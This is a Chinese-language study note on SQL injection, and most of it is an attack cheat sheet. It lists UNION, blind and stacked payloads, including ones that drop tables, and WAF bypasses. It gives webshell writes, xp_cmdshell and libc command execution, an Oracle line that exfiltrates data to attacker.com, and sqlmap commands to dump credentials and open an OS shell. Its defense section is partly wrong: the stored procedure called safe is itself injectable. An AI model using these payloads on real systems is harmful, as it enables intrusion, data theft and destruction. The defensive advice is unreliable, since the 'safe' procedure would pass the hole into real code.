# SQL注入深度攻击与防御

## 简介
SQL注入是一种代码注入攻击，利用应用对用户输入的不当处理来执行恶意SQL语句。

## 注入类型

### 1. 联合查询注入（UNION-Based）
```sql
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,NULL,NULL--
```

### 2. 布尔盲注（Boolean-Based Blind）
```sql
' AND 1=1--
' AND 1=2--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
```

### 3. 时间盲注（Time-Based Blind）
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--
```

### 4. 报错注入（Error-Based）
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
```

### 5. 堆查询注入（Stacked Queries）
```sql
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','pass');--
```

## 高级利用技术

### 1. 绕过WAF
```sql
# 注释绕过
/**/UNION/**/SELECT/**/

# 大小写混合
UniOn SeLeCt

# 编码绕过
%55NION%53ELECT

# 双重URL编码
%2555ION%2553ELECT

# 空格替代
/**/union/**/select/**/

# Tabs和换行
UNION
SELECT

# 十六进制
0x554e494f4e
```

### 2. 绕过过滤
```sql
# OR/AND过滤
' || '1'='1
' %26%26 '1'='1

# 空格过滤
'/**/UNION/**/SELECT/**/
'%09UNION%09SELECT%09'
'_'UNION'_'SELECT'_

# 引号过滤
' UNION SELECT 1,2,3-- (使用十六进制)
```

### 3. 字符编码
```sql
# UTF-8编码
%E2%80%99 (单引号)

# Unicode
\u0027 (单引号)
```

## 不同数据库利用

### 1. MySQL
```sql
# 获取版本
SELECT @@version

# 获取用户
SELECT user()

# 获取数据库
SELECT database()

# 读取文件
SELECT LOAD_FILE('/etc/passwd')

# 写入文件
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'

# 绕过单引号
' UNION SELECT * FROM users WHERE '1'='1
```

### 2. PostgreSQL
```sql
# 获取版本
SELECT version()

# 读取文件
SELECT pg_read_file('/etc/passwd', 0, 1000)

# 写入文件
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/shell.php'

# 命令执行
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'C' STRICT; --
```

### 3. MSSQL
```sql
# 获取版本
SELECT @@version

# 命令执行
EXEC xp_cmdshell 'whoami'

# 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# 读取文件
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents
```

### 4. Oracle
```sql
# 获取版本
SELECT banner FROM v$version WHERE rownum=1

# 获取用户
SELECT user FROM dual

# 延迟注入
'; DBMS_LOCK.SLEEP(5)--
'; UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
```

## 自动化工具

### 1. sqlmap基础使用
```bash
# 基本扫描
sqlmap -u "http://target.com/page?id=1"

# 指定数据库
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 获取列
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump

# 交互式shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 代理
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080
```

### 2. sqlmap高级选项
```bash
# 绕过WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# 盲注
sqlmap -u "http://target.com/page?id=1" --technique=B

# 时间盲注
sqlmap -u "http://target.com/page?id=1" --technique=T

# 暴力破解
sqlmap -u "http://target.com/page?id=1" --common-tables

# 文件读取
sqlmap -u "http://target.com/page?id=1" --file-read=/etc/passwd

# 文件写入
sqlmap -u "http://target.com/page?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/shell.php
```

### 3. 自定义tamper脚本
```python
# space2comment.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    if payload:
        return payload.replace(" ", "/**/")
    return payload
```

## 防御策略

### 1. 输入验证
```python
# Python示例
import re

def validate_input(user_input):
    # 允许的字符
    allowed_pattern = re.compile(r'^[a-zA-Z0-9_]+$')
    if not allowed_pattern.match(user_input):
        raise ValueError("Invalid input")
    return user_input
```

### 2. 参数化查询
```python
# Python (MySQL)
import mysql.connector

conn = mysql.connector.connect(...)
cursor = conn.cursor()
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### 3. 存储过程
```sql
-- 安全存储过程
CREATE PROCEDURE get_user(IN username VARCHAR(50))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE username = ''', username, '''');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END;
```

### 4. Web应用防火墙（WAF）
```bash
# ModSecurity规则
SecRule ARGS:id "@rx ^\d+$" "deny,status:400"
SecRule ARGS:username "@rx ^[a-zA-Z0-9_]+$" "pass"
```

### 5. 最小权限原则
```sql
-- 数据库用户权限限制
GRANT SELECT, INSERT ON myapp.* TO 'webapp'@'localhost';
REVOKE ALL ON myapp.* FROM 'webapp'@'localhost';
```

### 6. 定期安全测试
```bash
# 使用sqlmap测试
sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5
```

## 检测与应急

### 1. 日志分析
```bash
# Apache日志
grep -i "union.*select" /var/log/apache2/access.log

# MySQL慢查询日志
grep "SELECT.*FROM.*WHERE" /var/log/mysql/slow-query.log

# WAF日志
tail -f /var/log/waf.log
```

### 2. 异常检测
```bash
# 监控异常SQL
SELECT * FROM logs WHERE sql_query LIKE '%UNION%' OR sql_query LIKE '%SELECT%';
```

### 3. 应急响应
```sql
-- 隔离受影响的数据库
REVOKE ALL PRIVILEGES FROM compromised_user;

-- 检查数据泄露
SELECT * FROM users WHERE password IS NOT NULL AND last_login > '2024-01-01';
```

---
*学习时间: 2026-02-21*
*目标: 成为世界第一黑客*
